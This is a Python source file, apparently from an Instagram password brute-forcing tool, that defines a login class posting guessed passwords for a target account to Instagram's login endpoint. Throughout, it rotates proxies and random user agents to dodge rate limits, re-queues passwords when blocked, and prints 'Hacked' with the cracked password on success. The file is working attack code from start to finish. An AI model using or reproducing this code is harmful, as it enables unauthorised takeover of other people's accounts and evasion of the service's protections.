import datetime
import json
import os
import time
import requests
from Printf import printf
from Proxy import proxy
from useragent import Useragent

# {"user":true,"userId":"***********","authenticated":true,"oneTapPrompt":true,"status":"ok"}
# ERRORS:
#    - checkpoint_required

class Login:
    def __init__(self, target: str, password: str, id:str, proxy_data: dict, controlPort: int, timeout:int, retry_passwords:list):
        self.login_url = "https://www.instagram.com/accounts/login/ajax/"
        self.random_user_agent = Useragent.Devices().random()

        self.target = target
        self.password = password
        self.id = id
        self.proxy_data = proxy_data
        self.proxy_protocol = proxy_data["protocol"]
        self.proxy_ip = proxy_data["ip"]
        self.proxy_port = proxy_data["port"]
        self.proxy_password = proxy_data["password"]
        self.proxy_controlPort = controlPort
        self.timeout = timeout
        self.retry_passwords = retry_passwords

    def t(self):
        return str(datetime.datetime.now().strftime("%Y/%m/%d %I:%M:%S %p"))
    def Try(self):
        login_payload = f'username={self.target}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{self.password}&queryParams=%7B%7D&optIntoOneTap=false'
        headers = {
            'User-Agent': self.random_user_agent,
            'authority': 'www.instagram.com',
            'content-type': 'application/x-www-form-urlencoded',
            'accept': '*/*',
            'x-requested-with': 'XMLHttpRequest',
            'x-csrftoken': 'rn3aR7phKDodUHWdDfCGlERA7Gmhes8X',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.instagram.com/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
        }
        try:
            response = requests.post(self.login_url, headers=headers, data=login_payload,
                                    proxies={"http": "%s://%s:%s" % (self.proxy_protocol, self.proxy_ip, self.proxy_port),
                                             "https": "%s://%s:%s" % (self.proxy_protocol, self.proxy_ip, self.proxy_port)},
                                     timeout=self.timeout)
            if response.status_code == 200:
                resp_json = json.loads(response.text)
                print(response.text)
                if "authenticated" in resp_json:
                    if resp_json['authenticated'] == True:
                        printf(f"Hacked [{self.t()}]: '%s' password is '%s'" % (self.target, self.password), mt="success")
                        if "showAccountRecoveryModal" in resp_json:
                            printf(f"Recovery [{self.t()}]: instagram showed account recovery modal", mt="warn")
                        return True
                    else:
                        printf(f"Wrong [{self.t()}]: '%s:%s' says '%s' is invalid password for '%s'" % (self.proxy_ip, self.proxy_port, self.password, self.target), mt="error")
                        if "showAccountRecoveryModal" in resp_json:
                            printf(f"Recovery [{self.t()}]: instagram showed account recovery modal", mt="warn")
                        return False
            else:
                resp_json = json.loads(response.text)
                if "status" in resp_json:
                    if resp_json["status"] == "fail":
                        self.retry_passwords.append(self.password)
                        tw = os.get_terminal_size().columns # tw=terminal width
                        printf("-" * (tw - 2), mt="error")
                        printf(f"Warning [{self.t()}]: too many requests block message(%s)" % resp_json["message"], mt="warn")
                        printf("-" * (tw - 2), mt="error")
                        proxy.new(id=self.id, proxy_data=self.proxy_data, controlPort=self.proxy_controlPort)
                        if resp_json["message"] == "Please wait a few minutes before trying again.":
                            w = 60 # w=wait
                            at = self.t()
                            for i in range(60): # wait 1 minute
                                time.sleep(1)
                                w -= 1
                                printf(f"Sleeping [{at}]: {w}s")
                            # print() # to go to a new line (avoiding inline data output)
                        return False
                elif "errors" in resp_json:
                    self.retry_passwords.append(self.password)
                    tw = os.get_terminal_size().columns  # tw=terminal width
                    printf("-" * (tw - 2), mt="warn")
                    printf(f"Warning [{self.t()}]: generic error message(%s)" % resp_json["error"], mt="error")
                    printf("-" * (tw - 2), mt="warn")
                    proxy.new(id=self.id, proxy_data=self.proxy_data, controlPort=self.proxy_controlPort)
                    return False
        except ConnectionError:
            printf(f"Error [{self.t()}]: proxy '%s:%s' might be down" % (self.proxy_ip, self.proxy_port), mt="error")
        except Exception as error:
            printf(f"Error [{self.t()}]: '{error}'", mt="error")